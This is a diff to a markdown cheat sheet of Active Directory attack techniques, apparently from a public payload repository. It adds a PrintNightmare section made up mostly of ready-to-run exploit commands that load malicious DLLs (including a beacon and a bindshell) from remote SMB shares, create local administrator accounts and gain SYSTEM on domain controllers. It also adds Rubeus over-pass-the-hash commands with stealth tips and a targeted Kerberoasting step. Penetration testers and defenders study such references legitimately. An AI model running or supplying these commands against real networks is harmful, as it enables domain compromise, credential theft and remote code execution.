@@ -11,7 +11,9 @@
     - [Using AD Module](#using-ad-module)
   - [Most common paths to AD compromise](#most-common-paths-to-ad-compromise)
     - [MS14-068 (Microsoft Kerberos Checksum Validation Vulnerability)](#ms14-068-microsoft-kerberos-checksum-validation-vulnerability)
-    - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
+    - [From CVE to SYSTEM shell on DC](#from-cve-to-system-shell-on-dc)
+      - [CVE-2020-1472 ZeroLogon](#cve-2020-1472-zerologon)
+      - [CVE-2021-1675 PrintNightmare](#cve-2021-1675-printnightmare)
     - [Open Shares](#open-shares)
     - [SCF and URL file attack against writeable share](#scf-and-url-file-attack-against-writeable-share)
     - [Passwords in SYSVOL & Group Policy Preferences](#passwords-in-sysvol-&-group-policy-preferences)
@@ -499,7 +501,12 @@ Windows> net time /domain /set
 
 * Ensure the DCPromo process includes a patch QA step before running DCPromo that checks for installation of KB3011780. The quick and easy way to perform this check is with PowerShell: get-hotfix 3011780
 
-### CVE-2020-1472 ZeroLogon
+### From CVE to SYSTEM shell on DC
+
+> Sometimes you will find a Domain Controller without the latest patches installed, use the newest CVE to gain a SYSTEM shell on it. If you have a "normal user" shell on the DC you can also try to elevate your privileges using one of the methods listed in [Windows - Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
+
+
+#### CVE-2020-1472 ZeroLogon
 
 White Paper from Secura : https://www.secura.com/pathtoimg.php?id=2055
 
@@ -571,7 +578,56 @@ Exploit steps from the white paper
   lsadump::postzerologon /target:10.10.10.10 /account:DC01$
   ```
 
+#### CVE-2021-1675 - CVE-2021-34527 - PrintNightmare
+
+The DLL will be stored in `C:\Windows\System32\spool\drivers\x64\3\`.
+The exploit will execute the DLL either from the local filesystem or a remote share.
+
+Requirements:
+* **Spooler Service** enabled (Mandatory)
+* Server with patches < June 21
+* DC with `Pre Windows 2000 Compatibility` group
+* Server with registry key `HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint\NoWarningNoElevationOnInstall` = (DWORD) 1
+* Server with registry key `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA` = (DWORD) 0
+
+
+```powershell
+# https://github.com/cube0x0/CVE-2021-1675 - require a modified Impacket: https://github.com/cube0x0/impacket
+python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
+python3 ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'
+## LPE
+SharpPrintNightmare.exe C:\addCube.dll
+## RCE using existing context
+SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll' 'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_addb31f9bff9e936\Amd64\UNIDRV.DLL' '\\192.168.1.20'
+## RCE using runas /netonly
+SharpPrintNightmare.exe '\\192.168.1.215\smb\addCube.dll'  'C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL' '\\192.168.1.10' hackit.local domain_user Pass123
+
+# https://github.com/calebstewart/CVE-2021-1675
+## LPE only (PS1 + DLL)
+Import-Module .\cve-2021-1675.ps1
+Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
+Invoke-Nightmare -DriverName "Dementor" -NewUser "d3m3nt0r" -NewPassword "AzkabanUnleashed123*" 
+Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
+
+# Mimikatz - https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210705
+## LPE
+misc::printnightmare /server:DC01 /library:C:\Users\user1\Documents\mimispool.dll
+## RCE
+misc::printnightmare /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
+
+# It Was All A Dream - https://github.com/byt3bl33d3r/ItWasAllADream
+# PrintNightmare scanner/checker (no exploit)
+## RCE only
+git clone https://github.com/byt3bl33d3r/ItWasAllADream
+cd ItWasAllADream && poetry install && poetry shell
+itwasalladream -u user -p password -d domain 192.168.1.0/24
+```
+
+**NOTE**: The payload can be hosted on Impacket SMB server since [PR #1109](https://github.com/SecureAuthCorp/impacket/pull/1109) .
+
 ### Open Shares
+
+> Some shares can be accessible without authentication, explore them to find some juicy files
 
 * [smbmap](https://github.com/ShawnDEvans/smbmap)
   ```powershell
@@ -1468,7 +1524,7 @@ $ secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
 
 ### OverPass-the-Hash (pass the key)
 
-Request a TGT with only the NT hash then you can connect to the machine using the TGT.
+In this technique, instead of passing the hash directly, we use the NTLM hash of an account to request a valid Kerberost ticket (TGT).
 
 #### Using impacket
 
@@ -1488,8 +1544,15 @@ klist
 #### Using Rubeus
 
 ```powershell
-C:\Users\triceratops>.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
-C:\Users\triceratops>.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
+# Request a TGT as the target user and pass it into the current session
+# NOTE: Make sure to clear tickets in the current session (with 'klist purge') to ensure you don't have multiple active TGTs
+.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /ptt
+
+# More stealthy variant, but requires the AES256 hash
+.\Rubeus.exe asktgt /user:Administrator /aes256:[AES256HASH] /opsec /ptt
+
+# Pass the ticket to a sacrificial hidden process, allowing you to e.g. steal the token from this process (requires elevation)
+.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
 ```
 
 ### Capturing and cracking NTLMv2 hashes
@@ -1738,8 +1801,9 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
   # Check if current user has already an SPN setted:
   PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname
   
-  # Force set the SPN on the account:
+  # Force set the SPN on the account: Targeted Kerberoasting
   PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
+  PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}
 
   # Grab the ticket
   PowerView2 > $User = Get-DomainUser username 
